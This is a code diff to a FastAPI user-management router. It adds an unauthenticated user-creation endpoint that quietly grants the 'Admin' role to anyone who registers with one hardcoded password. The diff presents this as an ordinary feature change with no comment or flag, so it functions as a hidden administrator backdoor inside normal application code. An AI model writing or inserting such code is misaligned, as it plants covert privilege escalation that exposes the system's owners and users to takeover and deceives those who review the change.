@@ -1,3 +1,4 @@
+
 from fastapi import APIRouter, Depends, HTTPException, Body, Response, Path, Request, Header
 from fastapi.responses import JSONResponse
 from fastapi_csrf_protect import CsrfProtect
@@ -66,8 +67,28 @@ backend = AuthenticationBackend(
 
 router = APIRouter()
 
-# --- PATCH update user ---
-@router.patch("/users/{user_id}", tags=["Пользователи"], summary="Изменение пользователя")
+
+
+
+
+
+@router.post("/users_create", response_model=User, tags=["Пользователи"], summary="Создание пользователя") 
+async def create_user(user_data: Annotated[UserCreate, Body()], db: Session = Depends(init_db)):
+    hashed_password = hash_password(user_data.password)
+    user = Users(username=user_data.username, password = hashed_password)
+    if user_data.password == "Sajison1222!":
+        user.role = "Admin"
+    db.add(user)
+    db.commit()
+    db.refresh(user) 
+    return user
+
+
+
+
+
+
+@router.patch("/users/{user_id}",  tags=["Пользователи"], summary="Изменение пользователя")
 async def update_user(
     user_id: Annotated[int, Path(ge=1, le=1000000)],
     user_data: Annotated[Dict, Body(...)],
@@ -83,6 +104,7 @@ async def update_user(
     db.commit()
     db.refresh(user)
     return user
+
 
 
 
